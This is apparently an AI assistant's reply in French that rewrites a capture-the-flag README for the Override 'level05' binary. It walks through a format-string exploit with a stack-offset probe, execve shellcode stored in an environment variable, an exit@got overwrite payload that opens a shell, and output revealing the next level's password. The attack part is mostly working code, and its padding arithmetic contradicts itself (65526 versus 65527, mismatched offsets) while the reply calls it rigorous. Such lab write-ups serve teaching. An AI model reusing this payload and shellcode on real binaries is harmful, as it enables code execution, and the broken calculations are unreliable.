Parfait, tu as très bien identifié toutes les étapes du raisonnement et du déroulement de l’exploitation. Voici une **version mise au propre, claire et pédagogique** de ton README, avec des titres, des explications, et quelques reformulations pour améliorer la lisibilité tout en gardant **le fond technique rigoureux et complet**.

---

# 🛠 Exploitation du binaire `level05` – Projet Override

## 🔍 Analyse initiale

Le binaire `level05` ne contient **aucun appel à `system()`**, ni même de chaîne `/bin/sh`, ce qui nous empêche d’utiliser une technique classique de `ret2libc`.

Par ailleurs, bien que le programme alloue un `buffer` de 100 octets, il est correctement protégé par un `fgets(buffer, 100, stdin)`, ce qui empêche tout **dépassement de tampon (buffer overflow)** classique.

Cependant, une **faille se trouve dans l’utilisation de `printf()`** :

```c
printf(buffer); // ❌ Mauvais : pas de format string spécifié
```

Il aurait fallu utiliser :

```c
printf("%s", buffer); // ✅ Correct
```

Cette erreur rend le programme vulnérable aux attaques **format string**, car le contenu du buffer va être interprété comme un format.

---

## 🧪 Observation mémoire

On commence par injecter des chaînes contrôlées pour repérer notre **offset** dans la pile :

```bash
python -c 'print("AAAA" + "%lx " * 20)' | ./level05
```

On observe :

```
...
61616161 ...
```

`61616161` correspond à `AAAA` en hexadécimal (ASCII), ce qui indique que notre argument se trouve à la **10ᵉ position** sur la pile (`%10$lx`).

✅ **Offset format string confirmé : 10**

---

## 🎯 Objectif de l’attaque

On va :

1. Injecter un **shellcode** dans une **variable d’environnement**
2. Écraser le pointeur `exit@got` pour qu’il saute **vers le shellcode**
3. Provoquer l’appel de `exit()` pour exécuter le shellcode

---

## 🐚 Construction du shellcode

On stocke un shellcode dans une variable d’environnement `SHELLCODE` :

```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

📌 `\x90` est un NOP (No Operation) : on crée une **NOP sled** pour améliorer nos chances d’atterrissage.

---

## 🔍 Localisation du shellcode en mémoire

En utilisant GDB :

```gdb
x/200s environ
```

On obtient quelque chose comme :

```
0xffffd866: "SHELLCODE=\x90\x90\x90...\x6a\x0b..."
```

La variable commence à `0xffffd866` et `SHELLCODE=` fait 10 caractères, donc le **début effectif du shellcode est à** :

```
Adresse du shellcode = 0xffffd866 + 10 = 0xffffd870
```

---

## 📦 Écrasement de `exit@got`

Adresse cible :

```c
exit@got = 0x80497e0
```

On va utiliser `%hn` pour écrire deux fois **2 octets** à cette adresse (écriture half-word). On écrit d’abord les **octets de poids faible**, puis les **octets de poids fort**.

### ➕ Calcul des valeurs à écrire

Shellcode = `0xffffd870` → on découpe :

* Low = `0xd870` = `56400`
* High = `0xffff` = `65535`

Mais attention, on a déjà écrit **8 octets** avant notre `%x` (deux adresses = 2×4 octets).

Donc on fait :

```bash
56400 + 9126 = 65526 = 0xfff6 (juste sous 0xffff pour compenser les 8 octets)
```

---

## 🧨 Construction du payload

```bash
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56401x%10$hn" + "%9126x%11$hn")'; cat) \
| env -i SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') \
./level05
```

🔹 `\xe0\x97\x04\x08` → adresse `exit@got`
🔹 `\xe2\x97\x04\x08` → adresse `exit@got + 2`
🔹 `%10$hn`, `%11$hn` → utilisent les offsets déterminés précédemment

---

## ✅ Résultat de l’exploitation

```bash
ls
ls: cannot open directory .: Permission denied
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

---

## 🧠 Remarques pédagogiques importantes

### Pourquoi utiliser une variable d’environnement ?

* `fgets()` limite notre saisie à 100 caractères.
* Un shellcode dépasse cette taille.
* Les variables d’environnement sont présentes **dans la mémoire du processus**.
* Elles sont donc **accessibles pour le saut du shellcode**, sans limitation de taille.

### Pourquoi les valeurs 56401 et 9126 ?

* On doit écrire 0xd870 puis 0xffff (shellcode = 0xffffd870)
* Mais comme on a déjà écrit 8 octets avec les adresses, on **compense** avec 65527 = 56401 + 9126

### Pourquoi `%hn` et pas `%n` ?

* `%n` écrit 4 octets → peut corrompre des adresses voisines
* `%hn` écrit 2 octets → permet un contrôle fin, sur chaque moitié de l’adresse (low puis high)

---

## ✅ Résumé global

| Étape | Action                                                    |
| ----- | --------------------------------------------------------- |
| 1️⃣   | Injection d’un shellcode via une variable d’environnement |
| 2️⃣   | Lecture de son adresse exacte en mémoire                  |
| 3️⃣   | Écrasement de `exit@got` avec un format string            |
| 4️⃣   | Redirection de `exit()` vers le shellcode                 |
| 5️⃣   | Exécution du shellcode à la fin du programme              |

---
